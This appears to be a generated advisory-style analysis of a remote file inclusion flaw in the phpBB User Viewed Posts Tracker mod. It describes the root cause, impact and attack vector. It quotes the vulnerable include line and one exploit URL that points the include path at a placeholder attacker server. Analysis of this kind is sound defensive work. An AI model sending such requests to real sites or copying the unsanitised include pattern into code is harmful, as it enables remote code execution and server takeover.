Based on the provided content, here's a breakdown of the vulnerability:

**Root Cause:**

*   The vulnerability lies in the `phpBB User Viewed Posts Tracker` version 1.0 and earlier.
*   The root cause is an insecure `include_once` statement within the `includes/functions_user_viewed_posts.php` file.
*   The vulnerable code is: `include_once($phpbb_root_path . 'language/lang_' . $board_config['default_lang'] . '/lang_user_viewed_posts.' . $phpEx);`

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The `$phpbb_root_path` variable is not properly sanitized, allowing an attacker to include a remote file by controlling the value of the `phpbb_root_path` parameter.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a malicious file from a remote server (controlled by the attacker), an attacker can execute arbitrary code on the server running the vulnerable phpBB instance. This can lead to complete compromise of the system and the website it hosts.
*   **Data Breach/Manipulation:** If the attacker successfully uploads and executes malicious code, they can potentially steal sensitive data, manipulate data stored in the database or files, or deface the website.
*   **Denial of Service:** The attacker could potentially execute code that causes the server to crash, leading to a denial of service attack.

**Attack Vectors:**

*   **HTTP GET Request:** The vulnerability is triggered via an HTTP GET request.
*   **Manipulated Parameter:** Attackers exploit this vulnerability by manipulating the `phpbb_root_path` parameter in the URL of the vulnerable script (`includes/functions_user_viewed_posts.php`).

**Required Attacker Capabilities/Position:**

*   **Remote Attacker:** The attacker can be remote, requiring no prior access to the server.
*   **Network Access:** The attacker needs to have network access to the vulnerable server.
*   **Basic Understanding of HTTP:** The attacker only needs basic understanding of how to construct HTTP requests and how URL parameters work.

**Exploit Example:**

*   The exploit is done by sending a request similar to:
`/includes/functions_user_viewed_posts.php?phpbb_root_path=http://attacker_server/malicious_file?`

**Additional Information:**
*   The exploit was discovered by XORON(turkish hacker).
*  The vulnerability affects phpBB User Viewed Posts Tracker version 1.0 and earlier.
*  CVSS base score of 7.5/10, with an exploitability subscore of 10/10 indicating an easily exploitable vulnerability.
